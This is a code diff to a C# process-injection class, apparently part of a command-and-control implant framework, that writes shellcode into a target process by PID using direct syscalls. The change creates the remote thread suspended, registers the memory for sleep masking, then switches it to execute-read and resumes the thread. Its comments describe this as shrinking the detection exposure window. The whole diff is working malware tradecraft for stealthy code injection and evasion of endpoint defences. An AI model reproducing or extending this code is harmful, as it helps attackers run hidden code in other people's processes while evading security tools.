@@ -71,6 +71,9 @@ namespace Injection.Techniques.Syscall_x64
         private NtWriteVirtualMemory _pNtWriteVirtualMemory;
         private NtCreateThreadExDelegate _pNtCreateThreadEx;
 
+        private delegate uint NtResumeThread(IntPtr hThread, out uint suspendCount);
+        private NtResumeThread _pNtResumeThread;
+
         public NtCreateThreadEx(IAgent agent, byte[] code, int pid)
         {
             _code = code;
@@ -183,6 +186,15 @@ namespace Injection.Techniques.Syscall_x64
             {
                 throw new Exception("Failed to resolve function pointer for NtWriteVirtualMemory", ex);
             }
+
+            try
+            {
+                _pNtResumeThread = _syscall.MarshalNtSyscall<NtResumeThread>("NtResumeThread");
+            }
+            catch (Exception ex)
+            {
+                throw new Exception("Failed to resolve function pointer for NtResumeThread", ex);
+            }
         }
 
         public override bool Inject(string arguments = "")
@@ -213,24 +225,14 @@ namespace Injection.Techniques.Syscall_x64
                     _code,
                     codeLen,
                     out uint bytesWritten);
-                
-                ntStatus = _pNtProtectVirtualMemory(
-                    _hProcess,
-                    ref pMemoryAllocation,
-                    ref codeLen,
-                    Win32.MemoryProtection.ExecuteRead,
-                    out Win32.MemoryProtection _);
-                if (ntStatus != 0)
-                {
-                    throw new Exception("Failed to set memory protection");
-                }
-                
+
+                // Create thread SUSPENDED while memory is still RW
                 IntPtr hThread = new IntPtr(0);
                 Win32.ACCESS_MASK dwDesiredAccess =
                     Win32.ACCESS_MASK.SPECIFIC_RIGHTS_ALL | Win32.ACCESS_MASK.STANDARD_RIGHTS_ALL;
                 IntPtr pObjectAttributes = new IntPtr(0);
                 IntPtr lpParameter = new IntPtr(0);
-                bool bCreateSuspended = false;
+                bool bCreateSuspended = true;
                 uint stackZeroBits = 0;
                 uint sizeOfStackCommit = 0xFFFF;
                 uint sizeOfStackReserve = 0xFFFF;
@@ -253,7 +255,22 @@ namespace Injection.Techniques.Syscall_x64
                     throw new Exception("Failed to create thread");
                 }
 
+                // Register for sleep masking before the thread ever runs
                 RegisterSleepMaskRegion(pMemoryAllocation, _code.Length);
+
+                // Now flip to RX and resume - minimal exposure window
+                ntStatus = _pNtProtectVirtualMemory(
+                    _hProcess,
+                    ref pMemoryAllocation,
+                    ref codeLen,
+                    Win32.MemoryProtection.ExecuteRead,
+                    out Win32.MemoryProtection _);
+                if (ntStatus != 0)
+                {
+                    throw new Exception("Failed to set memory protection");
+                }
+
+                _pNtResumeThread(hThread, out uint _);
             }
             catch
             {
